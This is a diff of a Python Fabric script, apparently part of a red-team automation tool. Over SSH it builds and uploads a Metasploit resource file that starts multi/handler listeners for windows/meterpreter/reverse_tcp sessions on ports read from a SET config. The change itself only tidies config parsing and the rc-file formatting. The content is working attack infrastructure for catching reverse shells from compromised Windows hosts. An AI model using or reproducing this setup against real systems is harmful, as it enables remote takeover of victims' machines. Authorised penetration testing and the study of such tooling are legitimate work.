@@ -99,23 +99,23 @@ def get_logz(host, user, sshkey):
 def metalistener(host, user, sshkey):
     with settings(host_string = host, user = user, key_filename = sshkey, warn_only =  True):
         setconf = open("config/autoset/set_config", "r")
-        for line in setconf.readlines():
-            if "POWERSHELL_MULTI_PORTS" in line:
-                line_str = line.split("=")
-                ports = line_str[1].split(",")
-            else:
-                print "check your set_config file for POWERSHELL_MULTI_PORTS ports..."
-                pass
+        setconffile = setconf.readlines()
+        setconf.close()
+        for line in setconffile:
+            if 'POWERSHELL_MULTI_PORTS' in line:
+                line_str = line.strip().split('=')
+                ports = line_str[1].strip().split(',')
+                print ports
 
         metarc = open("data/temp/meta_config", "a")
         for port in ports:
-            metarc.write("""\nuse exploit/multi/handler\n
-                         set PAYLOAD windows/meterpreter/reverse_tcp\n
-                         set LHOST %s\n
-                         set EnableStageEncoding true\n
-                         set ExitOnSession false\n
-                         set LPORT %s\n
-                         exploit -j""" % (host, port))
+            metarc.write("""\nuse exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST %s
+set EnableStageEncoding true
+set ExitOnSession false
+set LPORT %s
+exploit -j\r\n""" % (host, port))
 
         metarc.close()
         put("data/temp/meta_config", "/tmp/meta_config")
